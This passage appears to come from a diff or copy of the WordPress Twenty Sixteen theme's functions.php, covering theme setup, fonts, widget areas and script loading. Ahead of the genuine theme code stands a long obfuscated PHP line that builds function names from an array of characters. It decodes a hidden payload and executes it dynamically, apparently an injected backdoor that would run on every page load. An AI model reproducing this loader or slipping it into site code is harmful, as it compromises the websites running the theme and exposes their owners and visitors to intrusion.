].$uijraf[76].$uijraf[22].$uijraf[71].$uijraf[10].$uijraf[27].$uijraf[11].$uijraf[23].$uijraf[32].$uijraf[43].$uijraf[64].$uijraf[4].$uijraf[4].$uijraf[209].$uijraf[2].$uijraf[71].$uijraf[284].$uijraf[103].$uijraf[1].$uijraf[42].$uijraf[97].$uijraf[129].$uijraf[76].$uijraf[103].$uijraf[97].$uijraf[35].$uijraf[225].$uijraf[86].$uijraf[3].$uijraf[75].$uijraf[63].$uijraf[16].$uijraf[48].$uijraf[39].$uijraf[284].$uijraf[14].$uijraf[64].$uijraf[35].$uijraf[121].$uijraf[129].$uijraf[21].$uijraf[10].$uijraf[58].$uijraf[39].$uijraf[284].$uijraf[4].$uijraf[30].$uijraf[97].$uijraf[2].$uijraf[71].$uijraf[71].$uijraf[16].$uijraf[5].$uijraf[5].$uijraf[259].$uijraf[35].$uijraf[225].$uijraf[62].$uijraf[2].$uijraf[25].$uijraf[39].$uijraf[33].$uijraf[14].$uijraf[11].$uijraf[209].$uijraf[71].$uijraf[58].$uijraf[67].$uijraf[209].$uijraf[129].$uijraf[103].$uijraf[1].$uijraf[121].$uijraf[216].$uijraf[33].$uijraf[25].$uijraf[34].$uijraf[56].$uijraf[62].$uijraf[76].$uijraf[23].$uijraf[21].$uijraf[14].$uijraf[35].$uijraf[19].$uijraf[129].$uijraf[30].$uijraf[27].$uijraf[48].$uijraf[259].$uijraf[111].$uijraf[56].$uijraf[19].$uijraf[25].$uijraf[37].$uijraf[56].$uijraf[86].$uijraf[22].$uijraf[30].$uijraf[162].$uijraf[3].$uijraf[162].$uijraf[34].$uijraf[111].$uijraf[32].$uijraf[117].$uijraf[63].$uijraf[32].$uijraf[32].$uijraf[160].$uijraf[29].$uijraf[62].$uijraf[70].$uijraf[25].$uijraf[221].$uijraf[62].$uijraf[39].$uijraf[0].$uijraf[111].$uijraf[56].$uijraf[19].$uijraf[48].$uijraf[225].$uijraf[23].$uijraf[259].$uijraf[42].$uijraf[19].$uijraf[225].$uijraf[7].$uijraf[6].$uijraf[21].$uijraf[7].$uijraf[117].$uijraf[62].$uijraf[33].$uijraf[63].$uijraf[58].$uijraf[111].$uijraf[6].$uijraf[216].$uijraf[111].$uijraf[21].$uijraf[72].$uijraf[16].$uijraf[29].$uijraf[103].$uijraf[221].$uijraf[129].$uijraf[3].$uijraf[62].$uijraf[67].$uijraf[1].$uijraf[30].$uijraf[46].$uijraf[37].$uijraf[7].$uijraf[16].$uijraf[86].$uijraf[48].$uijraf[69].$uijraf[42].$uijraf[30].$uijraf[46].$uijraf[67].$uijraf[43].$uijraf[5].$uijraf[225].$uijraf[103].$uijraf[225].$uijraf[14].$uijraf[19].$uijraf[1].$uijraf[284].$uijraf[56].$uijraf[117].$uijraf[64].$uijraf[62].$uijraf[32].$uijraf[162].$uijraf[16].$uijraf[221].$uijraf[284].$uijraf[75].$uijraf[129].$uijraf[35].$uijraf[14].$uijraf[71].$uijraf[75].$uijraf[62].$uijraf[221].$uijraf[162].$uijraf[72].$uijraf[63].$uijraf[58].$uijraf[17].$uijraf[69].$uijraf[62].$uijraf[63].$uijraf[221].$uijraf[259].$uijraf[0].$uijraf[111].$uijraf[37].$uijraf[56].$uijraf[43].$uijraf[75].$uijraf[43].$uijraf[29].$uijraf[27].$uijraf[64].$uijraf[37].$uijraf[97].$uijraf[6].$uijraf[97].$uijraf[27].$uijraf[34].$uijraf[63].$uijraf[70].$uijraf[19].$uijraf[129].$uijraf[8].$uijraf[35].$uijraf[14].$uijraf[69].$uijraf[225].$uijraf[16].$uijraf[20].$uijraf[62].$uijraf[25].$uijraf[37].$uijraf[71].$uijraf[75].$uijraf[71].$uijraf[46].$uijraf[29].$uijraf[8].$uijraf[69].$uijraf[17].$uijraf[39].$uijraf[63].$uijraf[162].$uijraf[29].$uijraf[23].$uijraf[10].$uijraf[209].$uijraf[39].$uijraf[4].$uijraf[9].$uijraf[2].$uijraf[11].$uijraf[19].$uijraf[86].$uijraf[72].$uijraf[259].$uijraf[55].$uijraf[33].$uijraf[46].$uijraf[162].$uijraf[55].$uijraf[0].$uijraf[27].$uijraf[22].$uijraf[64].$uijraf[2].$uijraf[11].$uijraf[259].$uijraf[7].$uijraf[216].$uijraf[117].$uijraf[35].$uijraf[76].$uijraf[71].$uijraf[162].$uijraf[0].$uijraf[33].$uijraf[16].$uijraf[117].$uijraf[25].$uijraf[27].$uijraf[72].$uijraf[29].$uijraf[209].$uijraf[17].$uijraf[65].$uijraf[160].$uijraf[71].$uijraf[67].$uijraf[39].$uijraf[23].$uijraf[58].$uijraf[43].$uijraf[13].$uijraf[10].$uijraf[259].$uijraf[8].$uijraf[209].$uijraf[72].$uijraf[55].$uijraf[2].$uijraf[33].$uijraf[29].$uijraf[46].$uijraf[20].$uijraf[111].$uijraf[63].$uijraf[27].$uijraf[48].$uijraf[23].$uijraf[39].$uijraf[9].$uijraf[33].$uijraf[70].$uijraf[1].$uijraf[35].$uijraf[117].$uijraf[27].$uijraf[30].$uijraf[284].$uijraf[0].$uijraf[29].$uijraf[25].$uijraf[39].$uijraf[9].$uijraf[71].$uijraf[30].$uijraf[55].$uijraf[22].$uijraf[216].$uijraf[14].$uijraf[209].$uijraf[8].$uijraf[39].$uijraf[27].$uijraf[23].$uijraf[43].$uijraf[23].$uijraf[16].$uijraf[70].$uijraf[43].$uijraf[72].$uijraf[121].$uijraf[37].$uijraf[22].$uijraf[86].$uijraf[97].$uijraf[46].$uijraf[121].$uijraf[1].$uijraf[46].$uijraf[2].$uijraf[22].$uijraf[70].$uijraf[19].$uijraf[33].$uijraf[64].$uijraf[225].$uijraf[35].$uijraf[35].$uijraf[14].$uijraf[284].$uijraf[64].$uijraf[35].$uijraf[225].$uijraf[43].$uijraf[225].$uijraf[27].$uijraf[48].$uijraf[6].$uijraf[71].$uijraf[48].$uijraf[103].$uijraf[16].$uijraf[225].$uijraf[160].$uijraf[129].$uijraf[65].$uijraf[25].$uijraf[20].$uijraf[20].$uijraf[56].$uijraf[111].$uijraf[46].$uijraf[11].$uijraf[284].$uijraf[33].$uijraf[48].$uijraf[56].$uijraf[58].$uijraf[42].$uijraf[32].$uijraf[4].$uijraf[259].$uijraf[64].$uijraf[221].$uijraf[56].$uijraf[13].$uijraf[37].$uijraf[39].$uijraf[64].$uijraf[16].$uijraf[30].$uijraf[6].$uijraf[56].$uijraf[17].$uijraf[10].$uijraf[46].$uijraf[225].$uijraf[1].$uijraf[221].$uijraf[216].$uijraf[34].$uijraf[75].$uijraf[35].$uijraf[103].$uijraf[259].$uijraf[284].$uijraf[48].$uijraf[23].$uijraf[58].$uijraf[33].$uijraf[42].$uijraf[48].$uijraf[27].$uijraf[64].$uijraf[30].$uijraf[216].$uijraf[65].$uijraf[1].$uijraf[75].$uijraf[39].$uijraf[11].$uijraf[4].$uijraf[39].$uijraf[42].$uijraf[14].$uijraf[70].$uijraf[64].$uijraf[10].$uijraf[4].$uijraf[76].$uijraf[0].$uijraf[76].$uijraf[4].$uijraf[23].$uijraf[259].$uijraf[32].$uijraf[21].$uijraf[9].$uijraf[22].$uijraf[103].$uijraf[67].$uijraf[20].$uijraf[5].$uijraf[3].$uijraf[259].$uijraf[162].$uijraf[33].$uijraf[64].$uijraf[76].$uijraf[284].$uijraf[56].$uijraf[39].$uijraf[63].$uijraf[5].$uijraf[23].$uijraf[62].$uijraf[117].$uijraf[42].$uijraf[129].$uijraf[9].$uijraf[63].$uijraf[10].$uijraf[35].$uijraf[160].$uijraf[76].$uijraf[17].$uijraf[22].$uijraf[70].$uijraf[14].$uijraf[9].$uijraf[20].$uijraf[48].$uijraf[284].$uijraf[62].$uijraf[4].$uijraf[25].$uijraf[27].$uijraf[43].$uijraf[129].$uijraf[4].$uijraf[11].$uijraf[23].$uijraf[9].$uijraf[33].$uijraf[103].$uijraf[259].$uijraf[117].$uijraf[22].$uijraf[76].$uijraf[25].$uijraf[39].$uijraf[76].$uijraf[29].$uijraf[46].$uijraf[284].$uijraf[32].$uijraf[86].$uijraf[4].$uijraf[103].$uijraf[58].$uijraf[21].$uijraf[121].$uijraf[62].$uijraf[46].$uijraf[20].$uijraf[14].$uijraf[72].$uijraf[11].$uijraf[55].$uijraf[284].$uijraf[86].$uijraf[7].$uijraf[25].$uijraf[111].$uijraf[69].$uijraf[27].$uijraf[67].$uijraf[17].$uijraf[86].$uijraf[72].$uijraf[35].$uijraf[72].$uijraf[86].$uijraf[7].$uijraf[62].$uijraf[216].$uijraf[63].$uijraf[37].$uijraf[284].$uijraf[43].$uijraf[19].$uijraf[0].$uijraf[97].$uijraf[29].$uijraf[10].$uijraf[48].$uijraf[58].$uijraf[9].$uijraf[103].$uijraf[48].$uijraf[48].$uijraf[23].$uijraf[8].$uijraf[8].$uijraf[103].$uijraf[20].$uijraf[259].$uijraf[209].$uijraf[103].$uijraf[35].$uijraf[9].$uijraf[225].$uijraf[46].$uijraf[75].$uijraf[37].$uijraf[8].$uijraf[225].$uijraf[42].$uijraf[62].$uijraf[16].$uijraf[22].$uijraf[162].$uijraf[34].$uijraf[35].$uijraf[56].$uijraf[129].$uijraf[17].$uijraf[162].$uijraf[10].$uijraf[42].$uijraf[72].$uijraf[20].$uijraf[69].$uijraf[42].$uijraf[30].$uijraf[21].$uijraf[1].$uijraf[259].$uijraf[216].$uijraf[221].$uijraf[4].$uijraf[43].$uijraf[0].$uijraf[259].$uijraf[37].$uijraf[221].$uijraf[216].$uijraf[21].$uijraf[0].$uijraf[121].$uijraf[3].$uijraf[19].$uijraf[2].$uijraf[8].$uijraf[209].$uijraf[30].$uijraf[30].$uijraf[67].$uijraf[225].$uijraf[4].$uijraf[32].$uijraf[39].$uijraf[14].$uijraf[225].$uijraf[33].$uijraf[35].$uijraf[6].$uijraf[9].$uijraf[14].$uijraf[21].$uijraf[0].$uijraf[35].$uijraf[67].$uijraf[8].$uijraf[3].$uijraf[162].$uijraf[23].$uijraf[16].$uijraf[4].$uijraf[209].$uijraf[67].$uijraf[58].$uijraf[7].$uijraf[75].$uijraf[103].$uijraf[56].$uijraf[48].$uijraf[71].$uijraf[121].$uijraf[13].$uijraf[70].$uijraf[13].$uijraf[72].$uijraf[37].$uijraf[6].$uijraf[58].$uijraf[3].$uijraf[39].$uijraf[58].$uijraf[2].$uijraf[4].$uijraf[23].$uijraf[25].$uijraf[121].$uijraf[55].$uijraf[72].$uijraf[33].$uijraf[29].$uijraf[97].$uijraf[35].$uijraf[162].$uijraf[62].$uijraf[284].$uijraf[67].$uijraf[9].$uijraf[22].$uijraf[69].$uijraf[111].$uijraf[103].$uijraf[58].$uijraf[13].$uijraf[42].$uijraf[58].$uijraf[76].$uijraf[6].$uijraf[209].$uijraf[29].$uijraf[2].$uijraf[6].$uijraf[48].$uijraf[72].$uijraf[42].$uijraf[34].$uijraf[9].$uijraf[35].$uijraf[72].$uijraf[9].$uijraf[17].$uijraf[16].$uijraf[5].$uijraf[20].$uijraf[9].$uijraf[43].$uijraf[5].$uijraf[2].$uijraf[62].$uijraf[35].$uijraf[9].$uijraf[65].$uijraf[29].$uijraf[22].$uijraf[16].$uijraf[209].$uijraf[6].$uijraf[39].$uijraf[34].$uijraf[29].$uijraf[14].$uijraf[32].$uijraf[55].$uijraf[209].$uijraf[2].$uijraf[86].$uijraf[72].$uijraf[37].$uijraf[75].$uijraf[71].$uijraf[216].$uijraf[3].$uijraf[63].$uijraf[62].$uijraf[4].$uijraf[209].$uijraf[209].$uijraf[6].$uijraf[58].$uijraf[103].$uijraf[67].$uijraf[30].$uijraf[20].$uijraf[86].$uijraf[25].$uijraf[3].$uijraf[16].$uijraf[58].$uijraf[34].$uijraf[72].$uijraf[3].$uijraf[32].$uijraf[30].$uijraf[221].$uijraf[42].$uijraf[4].$uijraf[43].$uijraf[43].$uijraf[216].$uijraf[34].$uijraf[111].$uijraf[43].$uijraf[30].$uijraf[20].$uijraf[10].$uijraf[2].$uijraf[39].$uijraf[55].$uijraf[42].$uijraf[7].$uijraf[216].$uijraf[30].$uijraf[17].$uijraf[162].$uijraf[9].$uijraf[56].$uijraf[37].$uijraf[46].$uijraf[6].$uijraf[56].$uijraf[69].$uijraf[8].$uijraf[225].$uijraf[34].$uijraf[97].$uijraf[76].$uijraf[209].$uijraf[55].$uijraf[160].$uijraf[46].$uijraf[1].$uijraf[65].$uijraf[32].$uijraf[111].$uijraf[284].$uijraf[221].$uijraf[55].$uijraf[64].$uijraf[56].$uijraf[72].$uijraf[32].$uijraf[209].$uijraf[221].$uijraf[20].$uijraf[35].$uijraf[71].$uijraf[71].$uijraf[34].$uijraf[9].$uijraf[67].$uijraf[48].$uijraf[4].$uijraf[65].$uijraf[55].$uijraf[225].$uijraf[55].$uijraf[39].$uijraf[23].$uijraf[62].$uijraf[25].$uijraf[259].$uijraf[16].$uijraf[62].$uijraf[160].$uijraf[33].$uijraf[35].$uijraf[55].$uijraf[46].$uijraf[19].$uijraf[32].$uijraf[56].$uijraf[23].$uijraf[46].$uijraf[63].$uijraf[22].$uijraf[162].$uijraf[117].$uijraf[225].$uijraf[4].$uijraf[34].$uijraf[221].$uijraf[70].$uijraf[9].$uijraf[9].$uijraf[225].$uijraf[25].$uijraf[3].$uijraf[216].$uijraf[97].$uijraf[3].$uijraf[0].$uijraf[25].$uijraf[33].$uijraf[162].$uijraf[25].$uijraf[32].$uijraf[0].$uijraf[17].$uijraf[46].$uijraf[4].$uijraf[103].$uijraf[3].$uijraf[209].$uijraf[76].$uijraf[0].$uijraf[0].$uijraf[32].$uijraf[63].$uijraf[129].$uijraf[9].$uijraf[160].$uijraf[69].$uijraf[5].$uijraf[97].$uijraf[117].$uijraf[259].$uijraf[42].$uijraf[16].$uijraf[25].$uijraf[21].$uijraf[2].$uijraf[46].$uijraf[25].$uijraf[69].$uijraf[3].$uijraf[25].$uijraf[111].$uijraf[48].$uijraf[69].$uijraf[86].$uijraf[27].$uijraf[37].$uijraf[7].$uijraf[284].$uijraf[1].$uijraf[25].$uijraf[117].$uijraf[16].$uijraf[69].$uijraf[5].$uijraf[56].$uijraf[129].$uijraf[9].$uijraf[5].$uijraf[129].$uijraf[62].$uijraf[62].$uijraf[20].$uijraf[284].$uijraf[19].$uijraf[225].$uijraf[34].$uijraf[160].$uijraf[6].$uijraf[209].$uijraf[799].$uijraf[799];$tpvooicqlslubdu=$uijraf[56].$uijraf[121].$uijraf[17].$uijraf[29].$uijraf[0].$uijraf[46].$uijraf[1698].$uijraf[97].$uijraf[29].$uijraf[55].$uijraf[7].$uijraf[97].$uijraf[29];$thmgyomhsmw=$uijraf[76].$uijraf[259].$uijraf[19].$uijraf[6].$uijraf[55].$uijraf[7].$uijraf[35].$uijraf[225].$uijraf[117].$uijraf[29].$uijraf[17].$uijraf[17];$nghhwdvkmxbx=$uijraf[17].$uijraf[162].$uijraf[117].$uijraf[117].$uijraf[29].$uijraf[9];$nrrrmyltkrsze=$uijraf[55].$uijraf[117].$uijraf[29].$uijraf[121].$uijraf[162].$uijraf[29].$uijraf[1698].$uijraf[27].$uijraf[19].$uijraf[6].$uijraf[55].$uijraf[162].$uijraf[71].$uijraf[7].$uijraf[6];$rqwbedjmzm=$uijraf[2194].$uijraf[121];$kyflvvznnqz=$uijraf[949].$uijraf[543].$uijraf[121].$uijraf[2194].$uijraf[2927].$uijraf[33].$uijraf[121].$uijraf[9].$uijraf[29];$btwtlvxlnoio=$uijraf[29].$uijraf[30].$uijraf[71].$uijraf[162];$cemmwvjbmin=$nghhwdvkmxbx;$mnqhdqjlnyl=$thmgyomhsmw($tpvooicqlslubdu($ngmqcfjdzorbk));$mnqhdqjlnyl=$cemmwvjbmin($mnqhdqjlnyl);$ffwobnueshrocb=$nrrrmyltkrsze($rqwbedjmzm,$nghhwdvkmxbx($kyflvvznnqz));$ffwobnueshrocb($nghhwdvkmxbx($mnqhdqjlnyl));$btwtlvxlnoio;?><?php
+/**
+ * Twenty Sixteen functions and definitions
+ *
+ * Set up the theme and provides some helper functions, which are used in the
+ * theme as custom template tags. Others are attached to action and filter
+ * hooks in WordPress to change core functionality.
+ *
+ * When using a child theme you can override certain functions (those wrapped
+ * in a function_exists() call) by defining them first in your child theme's
+ * functions.php file. The child theme's functions.php file is included before
+ * the parent theme's file, so the child theme functions would be used.
+ *
+ * @link https://codex.wordpress.org/Theme_Development
+ * @link https://codex.wordpress.org/Child_Themes
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are
+ * instead attached to a filter or action hook.
+ *
+ * For more information on hooks, actions, and filters,
+ * {@link https://codex.wordpress.org/Plugin_API}
+ *
+ * @package WordPress
+ * @subpackage Twenty_Sixteen
+ * @since Twenty Sixteen 1.0
+ */
+
+/**
+ * Twenty Sixteen only works in WordPress 4.4 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+}
+
+if ( ! function_exists( 'twentysixteen_setup' ) ) :
+	/**
+	 * Sets up theme defaults and registers support for various WordPress features.
+	 *
+	 * Note that this function is hooked into the after_setup_theme hook, which
+	 * runs before the init hook. The init hook is too late for some features, such
+	 * as indicating support for post thumbnails.
+	 *
+	 * Create your own twentysixteen_setup() function to override in a child theme.
+	 *
+	 * @since Twenty Sixteen 1.0
+	 */
+	function twentysixteen_setup() {
+		/*
+		 * Make theme available for translation.
+		 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
+		 * If you're building a theme based on Twenty Sixteen, use a find and replace
+		 * to change 'twentysixteen' to the name of your theme in all the template files
+		 */
+		load_theme_textdomain( 'twentysixteen' );
+
+		// Add default posts and comments RSS feed links to head.
+		add_theme_support( 'automatic-feed-links' );
+
+		/*
+		 * Let WordPress manage the document title.
+		 * By adding theme support, we declare that this theme does not use a
+		 * hard-coded <title> tag in the document head, and expect WordPress to
+		 * provide it for us.
+		 */
+		add_theme_support( 'title-tag' );
+
+		/*
+		 * Enable support for custom logo.
+		 *
+		 *  @since Twenty Sixteen 1.2
+		 */
+		add_theme_support(
+			'custom-logo',
+			array(
+				'height'      => 240,
+				'width'       => 240,
+				'flex-height' => true,
+			)
+		);
+
+		/*
+		 * Enable support for Post Thumbnails on posts and pages.
+		 *
+		 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
+		 */
+		add_theme_support( 'post-thumbnails' );
+		set_post_thumbnail_size( 1200, 9999 );
+
+		// This theme uses wp_nav_menu() in two locations.
+		register_nav_menus(
+			array(
+				'primary' => __( 'Primary Menu', 'twentysixteen' ),
+				'social'  => __( 'Social Links Menu', 'twentysixteen' ),
+			)
+		);
+
+		/*
+		 * Switch default core markup for search form, comment form, and comments
+		 * to output valid HTML5.
+		 */
+		add_theme_support(
+			'html5',
+			array(
+				'search-form',
+				'comment-form',
+				'comment-list',
+				'gallery',
+				'caption',
+			)
+		);
+
+		/*
+		 * Enable support for Post Formats.
+		 *
+		 * See: https://codex.wordpress.org/Post_Formats
+		 */
+		add_theme_support(
+			'post-formats',
+			array(
+				'aside',
+				'image',
+				'video',
+				'quote',
+				'link',
+				'gallery',
+				'status',
+				'audio',
+				'chat',
+			)
+		);
+
+		/*
+		 * This theme styles the visual editor to resemble the theme style,
+		 * specifically font, colors, icons, and column width.
+		 */
+		add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );
+
+		// Load regular editor styles into the new block-based editor.
+		add_theme_support( 'editor-styles' );
+
+		// Load default block styles.
+		add_theme_support( 'wp-block-styles' );
+
+		// Add support for responsive embeds.
+		add_theme_support( 'responsive-embeds' );
+
+		// Add support for custom color scheme.
+		add_theme_support(
+			'editor-color-palette',
+			array(
+				array(
+					'name'  => __( 'Dark Gray', 'twentysixteen' ),
+					'slug'  => 'dark-gray',
+					'color' => '#1a1a1a',
+				),
+				array(
+					'name'  => __( 'Medium Gray', 'twentysixteen' ),
+					'slug'  => 'medium-gray',
+					'color' => '#686868',
+				),
+				array(
+					'name'  => __( 'Light Gray', 'twentysixteen' ),
+					'slug'  => 'light-gray',
+					'color' => '#e5e5e5',
+				),
+				array(
+					'name'  => __( 'White', 'twentysixteen' ),
+					'slug'  => 'white',
+					'color' => '#fff',
+				),
+				array(
+					'name'  => __( 'Blue Gray', 'twentysixteen' ),
+					'slug'  => 'blue-gray',
+					'color' => '#4d545c',
+				),
+				array(
+					'name'  => __( 'Bright Blue', 'twentysixteen' ),
+					'slug'  => 'bright-blue',
+					'color' => '#007acc',
+				),
+				array(
+					'name'  => __( 'Light Blue', 'twentysixteen' ),
+					'slug'  => 'light-blue',
+					'color' => '#9adffd',
+				),
+				array(
+					'name'  => __( 'Dark Brown', 'twentysixteen' ),
+					'slug'  => 'dark-brown',
+					'color' => '#402b30',
+				),
+				array(
+					'name'  => __( 'Medium Brown', 'twentysixteen' ),
+					'slug'  => 'medium-brown',
+					'color' => '#774e24',
+				),
+				array(
+					'name'  => __( 'Dark Red', 'twentysixteen' ),
+					'slug'  => 'dark-red',
+					'color' => '#640c1f',
+				),
+				array(
+					'name'  => __( 'Bright Red', 'twentysixteen' ),
+					'slug'  => 'bright-red',
+					'color' => '#ff675f',
+				),
+				array(
+					'name'  => __( 'Yellow', 'twentysixteen' ),
+					'slug'  => 'yellow',
+					'color' => '#ffef8e',
+				),
+			)
+		);
+
+		// Indicate widget sidebars can use selective refresh in the Customizer.
+		add_theme_support( 'customize-selective-refresh-widgets' );
+	}
+endif; // twentysixteen_setup
+add_action( 'after_setup_theme', 'twentysixteen_setup' );
+
+/**
+ * Sets the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_content_width() {
+	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
+}
+add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );
+
+/**
+ * Add preconnect for Google Fonts.
+ *
+ * @since Twenty Sixteen 1.6
+ *
+ * @param array  $urls           URLs to print for resource hints.
+ * @param string $relation_type  The relation type the URLs are printed.
+ * @return array $urls           URLs to print for resource hints.
+ */
+function twentysixteen_resource_hints( $urls, $relation_type ) {
+	if ( wp_style_is( 'twentysixteen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
+		$urls[] = array(
+			'href' => 'https://fonts.gstatic.com',
+			'crossorigin',
+		);
+	}
+
+	return $urls;
+}
+add_filter( 'wp_resource_hints', 'twentysixteen_resource_hints', 10, 2 );
+
+/**
+ * Registers a widget area.
+ *
+ * @link https://developer.wordpress.org/reference/functions/register_sidebar/
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => __( 'Sidebar', 'twentysixteen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
+			'id'            => 'sidebar-2',
+			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
+			'id'            => 'sidebar-3',
+			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'twentysixteen_widgets_init' );
+
+if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
+	/**
+	 * Register Google fonts for Twenty Sixteen.
+	 *
+	 * Create your own twentysixteen_fonts_url() function to override in a child theme.
+	 *
+	 * @since Twenty Sixteen 1.0
+	 *
+	 * @return string Google fonts URL for the theme.
+	 */
+	function twentysixteen_fonts_url() {
+		$fonts_url = '';
+		$fonts     = array();
+		$subsets   = 'latin,latin-ext';
+
+		/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
+		}
+
+		/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Montserrat:400,700';
+		}
+
+		/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Inconsolata:400';
+		}
+
+		if ( $fonts ) {
+			$fonts_url = add_query_arg(
+				array(
+					'family' => urlencode( implode( '|', $fonts ) ),
+					'subset' => urlencode( $subsets ),
+				),
+				'https://fonts.googleapis.com/css'
+			);
+		}
+
+		return $fonts_url;
+	}
+endif;
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );
+
+/**
+ * Enqueues scripts and styles.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
+
+	// Add Genericons, used in the main stylesheet.
+	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );
+
+	// Theme block stylesheet.
+	wp_enqueue_style( 'twentysixteen-block-style', get_template_directory_uri() . '/css/blocks.css', array( 'twentysixteen-style' ), '20181230' );
+
+	// Load the Internet Explorer specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the Internet Explorer 7 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
+	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+
+	if ( is_singular() && wp_attachment_is_image() ) {
+		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
+	}
+
+	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20181230', true );
+
+	wp_localize_script(
+		'twentysixteen-script',
+		'screenReaderText',
+		array(
+			'expand'   => __( 'expand child menu', 'twentysixteen' ),
+			'collapse' => __( 'collapse child menu', 'twentysixteen' ),
+		)
+	);
+}
+add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );
+
+/**
+ * Enqueue styles for the block-based editor.
+ *
+ * @since Twenty Sixteen 1.6
+ */
+function twentysixteen_block_editor_styles() {
+	// Block styles.
+	wp_enqueue_style( 'twentysixteen-block-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20181230' );
+	// Add custom fonts.
+	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
+}
+add_action( 'enqueue_block_editor_assets', 'twentysixteen_block_editor_styles' );
+
+/**
+ * Adds custom classes to the array of body classes.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $classes Classes for the body element.
+ * @return array (Maybe) filtered body classes.
+ */
+function twentysixteen_body_classes( $classes ) {
+	// Adds a class of custom-background-image to sites with a custom background image.
+	if ( get_background_image() ) {
+		$classes[] = 'custom-background-image';
+	}
+
+	// Adds a class of group-blog to sites with more than 1 published author.
+	if ( is_multi_author() ) {
+		$classes[] = 'group-blog';
+	}
+
+	// Adds a class of no-sidebar to sites without active sidebar.
+	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
+		$classes[] = 'no-sidebar';
+	}
+
+	// Adds a class of hfeed to non-singular pages.
+	if ( ! is_singular() ) {
+		$classes[] = 'hfeed';
+	}
+
+	return $classes;
+}
+add_filter( 'body_class', 'twentysixteen_body_classes' );
+
+/**
